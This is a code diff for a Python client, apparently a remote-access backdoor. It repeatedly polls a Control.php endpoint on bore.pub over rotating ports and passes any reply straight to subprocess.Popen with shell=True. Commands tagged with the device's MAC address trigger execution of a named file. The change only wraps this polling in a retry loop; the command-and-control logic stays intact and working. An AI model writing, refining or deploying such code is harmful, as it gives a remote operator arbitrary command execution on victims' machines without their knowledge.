@@ -112,32 +112,34 @@ while True:
         def receive_data():
             global previous_command, previous_files
 
-            # Your code to fetch data from the PHP script goes here
-            port = random.choice([61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012])
-            php_script_url = f'http://bore.pub:{port}/Control.php'
-            
-            response = requests.get(php_script_url)
-            data = response.text.strip()
-
-            if data != "" and data != previous_command:
-                if '::' in data:
-                    mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
-                    mac = ':'.join([mac[e:e+2] for e in range(0, 12, 2)])
-                    received_mac, file_to_execute = data.split('::', 1)
-                    if received_mac == mac:
-                        # Check if the received file has been executed recently
-                        if file_to_execute not in previous_files or (time.time() - previous_files[file_to_execute]) > 30:
-                            # Execute the file
-                            subprocess.Popen(f"{file_to_execute}", shell=True)
-                            previous_files[file_to_execute] = time.time()
-                        else:
-                            print(f"Skipping file execution: File executed within 30 seconds.")
-                    else:
-                        print(f"Received data with MAC address {received_mac} does not match the device's MAC address.")
-                else:
-                    subprocess.Popen(f"{data}", shell=True)
+            while True:
+                # Your code to fetch data from the PHP script goes here
+                port = random.choice([61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012])
+                php_script_url = f'http://bore.pub:{port}/Control.php'
                 
-                previous_command = data
+                response = requests.get(php_script_url)
+                data = response.text.strip()
+
+                if data != "" and data != previous_command:
+                    if '::' in data:
+                        mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
+                        mac = ':'.join([mac[e:e+2] for e in range(0, 12, 2)])
+                        received_mac, file_to_execute = data.split('::', 1)
+                        if received_mac == mac:
+                            # Check if the received file has been executed recently
+                            if file_to_execute not in previous_files or (time.time() - previous_files[file_to_execute]) > 30:
+                                # Execute the file
+                                subprocess.Popen(f"{file_to_execute}", shell=True)
+                                previous_files[file_to_execute] = time.time()
+                            else:
+                                print(f"Skipping file execution: File executed within 30 seconds.")
+                        else:
+                            print(f"Received data with MAC address {received_mac} does not match the device's MAC address.")
+                    else:
+                        subprocess.Popen(f"{data}", shell=True)
+                    
+                    previous_command = data
+                    break  # Exit the loop after processing a command
 
         previous_command = ""
         previous_files = {}
